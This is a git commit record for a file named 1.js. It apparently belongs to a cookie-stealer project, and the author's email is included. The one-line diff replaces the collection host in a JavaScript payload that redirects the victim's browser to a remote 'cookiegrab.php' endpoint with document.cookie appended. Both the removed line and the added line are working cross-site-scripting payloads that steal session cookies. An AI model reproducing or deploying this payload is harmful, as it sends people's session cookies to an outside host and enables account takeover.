c4d8c5777eabcdcabcaf4b41544e6ce1b23930b3
andy1337 <oneshot2k12@gmail.com>
2020-04-12 03:06:14 +0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,1 @@
-document.location='http://kennethzhang.net/cookiegrab.php?c='+document.cookie;
+document.location='https://hydraruzxpnew4af.onlon.co/cookiestealer/cookie-stealer/cookiegrab.php?c='+document.cookie;
